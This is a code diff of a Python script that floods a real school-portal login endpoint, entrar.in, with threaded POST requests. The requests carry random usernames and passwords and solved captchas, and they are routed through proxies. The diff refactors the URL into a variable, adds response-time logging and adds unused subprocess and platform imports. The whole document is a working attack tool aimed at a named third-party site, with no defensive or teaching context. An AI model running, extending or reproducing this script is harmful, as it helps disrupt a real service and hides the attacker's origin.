@@ -1,3 +1,4 @@
+from re import sub
 import requests
 import random
 import json
@@ -5,6 +6,8 @@ from bs4 import BeautifulSoup as BS
 from colorama import Fore
 import threading
 from proxies import proxy
+import subprocess
+import platform
 
 print(
     """
@@ -33,14 +36,13 @@ class Console:
 
 
 def send_req():
+    url = "https://entrar.in/login/auth"
     user = Console.rand_gen_user()
     password = Console.rand_gen_pass()
     captcha = Console.captcha_solve()
     payload = {"username": user, "password": password, "captcha": captcha}
-    req = requests.post(
-        "https://entrar.in/login/auth", data=bytes(json.dumps(payload), encoding="utf-8"), proxies=proxy, timeout=5
-    )
-    print(Fore.LIGHTYELLOW_EX, "Request Sent to ------->", req.url)
+    req = requests.post(url, data=bytes(json.dumps(payload), encoding="utf-8"), proxies=proxy, timeout=5)
+    print(Fore.LIGHTYELLOW_EX, "Request Sent to ------->", req.url, "-", req.elapsed.total_seconds())
 
 
 threads = [
